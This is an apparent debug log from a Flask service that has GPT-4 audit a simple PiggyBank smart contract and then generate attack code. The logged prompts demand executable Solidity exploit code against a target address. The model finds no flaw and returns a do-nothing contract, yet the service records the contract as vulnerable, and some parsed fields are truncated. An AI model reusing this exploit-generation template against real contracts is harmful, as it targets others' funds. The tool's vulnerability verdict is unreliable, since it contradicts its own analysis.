  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 191, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-22 20:21:57,152 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-22 20:21:57,153 - app.modules.attack_generator - INFO - Contract name: PiggyBank
2025-06-22 20:21:57,154 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-22 20:21:57,155 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-22 20:21:57,157 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-22 20:21:57,160 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-22 20:21:57,161 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-22 20:22:07,152 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-22 20:22:07,197 - app.modules.attack_generator - INFO - Received response from OpenAI API in 10.04 seconds
2025-06-22 20:22:07,204 - app.modules.attack_generator - INFO - Contract analysis completed in 10.04 seconds
2025-06-22 20:22:07,205 - app.modules.attack_generator - INFO - Vulnerability assessment: - **Reentrancy:** The `withdraw()` function uses `transfer()`, which forwards a fixed 2300 gas stipe...
2025-06-22 20:22:07,207 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-22 20:22:07,208 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-22 20:22:07,209 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-22 20:22:07,210 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-22 20:22:08,687 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-22 20:22:08,710 - app.modules.attack_generator - INFO - Received response from OpenAI API in 1.50 seconds
2025-06-22 20:22:08,716 - app.modules.attack_generator - INFO - Attack code generation completed in 1.50 seconds
2025-06-22 20:22:08,718 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 137
2025-06-22 20:22:08,720 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 11.54 seconds
2025-06-22 20:22:08,723 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-22 20:22:08,727 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpgxxze42y.sol",\n  "contracts": [\n    {\n      "contract_name": "PiggyBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "stateMutability": "payable",\n          "type": "receive"\n        }\n      ],\n      "functions": [\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99990294240000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999578900000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "getBalance": 3000000000000000000,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract PiggyBank {\\n    address public owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    receive() external payable {}\\n\\n    function withdraw() external {\\n        require(msg.sender == owner, \\"Not the owner\\");\\n        payable(owner).transfer(address(this).balance);\\n    }\\n\\n    function getBalance() external view returns (uint) {\\n        return address(this).balance;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe contract `PiggyBank` is a simple wallet contract that holds ETH. It has an owner set at deployment (the deployer address). It accepts ETH via the `receive()` function and allows only the owner to withdraw the entire balance via the `withdraw()` function. The `getBalance()` function returns the current ETH balance of the contract.\n\n2. Vulnerability Assessment:  \n- **Reentrancy:** The `withdraw()` function uses `transfer()`, which forwards a fixed 2300 gas stipend and thus is generally safe from reentrancy attacks. No state changes occur after the transfer call, so reentrancy is not an issue here.  \n- **Permission Checks:** The `withdraw()` function correctly restricts withdrawals to the owner only via `require(msg.sender == owner)`. This is appropriate.  \n- **Logic Bugs:** No logic bugs are apparent. The contract simply holds ETH and allows the owner to withdraw all funds.  \n- **Math Errors:** No arithmetic operations are performed, so no math errors.  \n- **Unsafe Calls:** The use of `transfer()` is safe in terms of gas stipend, but it can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially locking funds. However, this is a known tradeoff and not a vulnerability per se.  \n- **Backdoors:** No backdoors or hidden functionality.  \n- **Economic Exploits:** None detected.  \n- **Upgradeability/Proxy:** Not applicable.  \n\n3. Exploitation Requirements:  \nNo vulnerabilities found that allow exploitation. Only the owner can withdraw funds, and the contract does not expose any other functions that can be abused.\n\n---\n\n**Summary:**  \n- Solidity version: `^0.8.0`  \n- The contract is a minimal ETH vault with owner-only withdrawal.  \n- No vulnerabilities detected.  \n- Potential minor usability issue: if the owner is a contract that requires more than 2300 gas on receiving ETH, `transfer()` will fail and funds could be locked. This is not a security vulnerability but a design consideration.  \n\nNo further action required.', 'contract_analysis': 'The contract `PiggyBank` is a simple wallet contract that holds ETH. It has an owner set at deployment (the deployer address). It accepts ETH via the `receive()` function and allows only the owner to withdraw the entire balance via the `withdraw()` function. The `getBalance()` function returns the current ETH balance of the contract.\n\n2.', 'vulnerability_assessment': '- **Reentrancy:** The `withdraw()` function uses `transfer()`, which forwards a fixed 2300 gas stipend and thus is generally safe from reentrancy attacks. No state changes occur after the transfer call, so reentrancy is not an issue here.  \n- **Permission Checks:** The `withdraw()` function correctly restricts withdrawals to the owner only via `require(msg.sender == owner)`. This is appropriate.  \n- **Logic Bugs:** No logic bugs are apparent. The contract simply holds ETH and allows the owner to withdraw all funds.  \n- **Math Errors:** No arithmetic operations are performed, so no math errors.  \n- **Unsafe Calls:** The use of `transfer()` is safe in terms of gas stipend, but it can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially locking funds. However, this is a known tradeoff and not a vulnerability per se.  \n- **Backdoors:** No backdoors or hidden functionality.  \n- **Economic Exploits:** None detected.  \n- **Upgradeability/Proxy:** Not applicable.  \n\n3.', 'exploitation_requirements': 'No vulnerabilities found that allow exploitation. Only the owner can withdraw funds, and the contract does not expose any other functions that can be abused.', 'analysis_duration': 10.037580728530884}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The contract `PiggyBank` is a simple wallet contract that holds ETH. It has an owner set at deployment (the deployer address). It accepts ETH via the `receive()` function and allows only the owner to withdraw the entire balance via the `withdraw()` function. The `getBalance()` function returns the current ETH balance of the contract.\n\n2.\n\nVulnerability Assessment: - **Reentrancy:** The `withdraw()` function uses `transfer()`, which forwards a fixed 2300 gas stipend and thus is generally safe from reentrancy attacks. No state changes occur after the transfer call, so reentrancy is not an issue here.  \n- **Permission Checks:** The `withdraw()` function correctly restricts withdrawals to the owner only via `require(msg.sender == owner)`. This is appropriate.  \n- **Logic Bugs:** No logic bugs are apparent. The contract simply holds ETH and allows the owner to withdraw all funds.  \n- **Math Errors:** No arithmetic operations are performed, so no math errors.  \n- **Unsafe Calls:** The use of `transfer()` is safe in terms of gas stipend, but it can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially locking funds. However, this is a known tradeoff and not a vulnerability per se.  \n- **Backdoors:** No backdoors or hidden functionality.  \n- **Economic Exploits:** None detected.  \n- **Upgradeability/Proxy:** Not applicable.  \n\n3.\n\nExploitation Requirements: No vulnerabilities found that allow exploitation. Only the owner can withdraw funds, and the contract does not expose any other functions that can be abused.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n", 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ncontract Attack {\n    constructor(address) {}\n\n    function attack() external payable {\n        revert();\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ncontract Attack {\n    constructor(address) {}\n\n    function attack() external payable {\n        revert();\n    }\n}', 'code_type': 'solidity', 'attack_duration': 1.5001142024993896}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpgxxze42y.sol",\n  "contracts": [\n    {\n      "contract_name": "PiggyBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "stateMutability": "payable",\n          "type": "receive"\n        }\n      ],\n      "functions": [\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99990294240000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999578900000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "getBalance": 3000000000000000000,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract PiggyBank {\\n    address public owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    receive() external payable {}\\n\\n    function withdraw() external {\\n        require(msg.sender == owner, \\"Not the owner\\");\\n        payable(owner).transfer(address(this).balance);\\n    }\\n\\n    function getBalance() external view returns (uint) {\\n        return address(this).balance;\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe contract `PiggyBank` is a simple wallet contract that holds ETH. It has an owner set at deployment (the deployer address). It accepts ETH via the `receive()` function and allows only the owner to withdraw the entire balance via the `withdraw()` function. The `getBalance()` function returns the current ETH balance of the contract.\n\n2. Vulnerability Assessment:  \n- **Reentrancy:** The `withdraw()` function uses `transfer()`, which forwards a fixed 2300 gas stipend and thus is generally safe from reentrancy attacks. No state changes occur after the transfer call, so reentrancy is not an issue here.  \n- **Permission Checks:** The `withdraw()` function correctly restricts withdrawals to the owner only via `require(msg.sender == owner)`. This is appropriate.  \n- **Logic Bugs:** No logic bugs are apparent. The contract simply holds ETH and allows the owner to withdraw all funds.  \n- **Math Errors:** No arithmetic operations are performed, so no math errors.  \n- **Unsafe Calls:** The use of `transfer()` is safe in terms of gas stipend, but it can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially locking funds. However, this is a known tradeoff and not a vulnerability per se.  \n- **Backdoors:** No backdoors or hidden functionality.  \n- **Economic Exploits:** None detected.  \n- **Upgradeability/Proxy:** Not applicable.  \n\n3. Exploitation Requirements:  \nNo vulnerabilities found that allow exploitation. Only the owner can withdraw funds, and the contract does not expose any other functions that can be abused.\n\n---\n\n**Summary:**  \n- Solidity version: `^0.8.0`  \n- The contract is a minimal ETH vault with owner-only withdrawal.  \n- No vulnerabilities detected.  \n- Potential minor usability issue: if the owner is a contract that requires more than 2300 gas on receiving ETH, `transfer()` will fail and funds could be locked. This is not a security vulnerability but a design consideration.  \n\nNo further action required.', 'reasoning': 'The contract `PiggyBank` is a simple wallet contract that holds ETH. It has an owner set at deployment (the deployer address). It accepts ETH via the `receive()` function and allows only the owner to withdraw the entire balance via the `withdraw()` function. The `getBalance()` function returns the current ETH balance of the contract.\n\n2.', 'summary': '- **Reentrancy:** The `withdraw()` function uses `transfer()`, which forwards a fixed 2300 gas stipend and thus is generally safe from reentrancy attacks. No state changes occur after the transfer call, so reentrancy is not an issue here.  \n- **Permission Checks:** The `withdraw()` function correctly restricts withdrawals to the owner only via `require(msg.sender == owner)`. This is appropriate.  \n- **Logic Bugs:** No logic bugs are apparent. The contract simply holds ETH and allows the owner to withdraw all funds.  \n- **Math Errors:** No arithmetic operations are performed, so no math errors.  \n- **Unsafe Calls:** The use of `transfer()` is safe in terms of gas stipend, but it can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially locking funds. However, this is a known tradeoff and not a vulnerability per se.  \n- **Backdoors:** No backdoors or hidden functionality.  \n- **Economic Exploits:** None detected.  \n- **Upgradeability/Proxy:** Not applicable.  \n\n3.', 'code': 'pragma solidity 0.8.0;\n\ncontract Attack {\n    constructor(address) {}\n\n    function attack() external payable {\n        revert();\n    }\n}', 'code_type': 'solidity', 'duration': 11.537694931030273}
2025-06-22 20:22:08,732 - app.services.contract_service - INFO - Has exploit code: True
2025-06-22 20:22:08,733 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-22 20:22:08,735 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-22 20:22:08,737 - app.services.contract_service - INFO - Attack strategy summary: - **Reentrancy:** The `withdraw()` function uses `transfer()`, which forwards a fixed 2300 gas stipend and thus is generally safe from reentrancy attacks. No state changes occur after the transfer call, so reentrancy is not an issue here.  
- **Permission Checks:** The `withdraw()` function correctly restricts withdrawals to the owner only via `require(msg.sender == owner)`. This is appropriate.  
- **Logic Bugs:** No logic bugs are apparent. The contract simply holds ETH and allows the owner to withdraw all funds.  
- **Math Errors:** No arithmetic operations are performed, so no math errors.  
- **Unsafe Calls:** The use of `transfer()` is safe in terms of gas stipend, but it can cause issues if the owner is a contract with a fallback function that requires more than 2300 gas, potentially locking funds. However, this is a known tradeoff and not a vulnerability per se.  
- **Backdoors:** No backdoors or hidden functionality.  
- **Economic Exploits:** None detected.  
- **Upgradeability/Proxy:** Not applicable.  

3.
2025-06-22 20:22:08,739 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-22 20:22:08,742 - app.services.contract_service - INFO - Temporary file /tmp/tmpgxxze42y.sol removed
2025-06-22 20:22:08,771 - app.api.contract - INFO - Report saved with filename: PiggyBank_2025-06-22_20-22, status: KO
2025-06-22 20:22:08,772 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-22 20:22:08,774 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:22:08,775 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:22:08,776 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:22:08,778 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:22:08,779 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:22:08] "POST /analyze HTTP/1.1" 200 -
2025-06-22 20:22:08,796 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:22:08,798 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:22:08,799 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:22:08,800 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 20:22:08,802 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:22:08] "OPTIONS /history HTTP/1.1" 200 -
2025-06-22 20:22:08,847 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:22:08,849 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:22:08,850 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:22:08,852 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:22:08,854 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:22:08] "GET /history HTTP/1.1" 200 -
2025-06-22 20:28:38,293 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:28:38,299 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:28:38,300 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:28:38,302 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 20:28:38,305 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:28:38] "GET /history HTTP/1.1" 200 -
2025-06-22 20:28:40,272 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:28:40,281 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:28:40,285 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 20:28:40,290 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-22 20:28:40,295 - werkzeug - INFO - 192.168.112.1 - - [22/Jun/2025 20:28:40] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-22 20:28:40,316 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 20:28:40,368 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 1, statut: OK, poids de la requ√™te: 2.0
2025-06-22 20:28:40,370 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 20:28:40,371 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 20:28:40,372 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
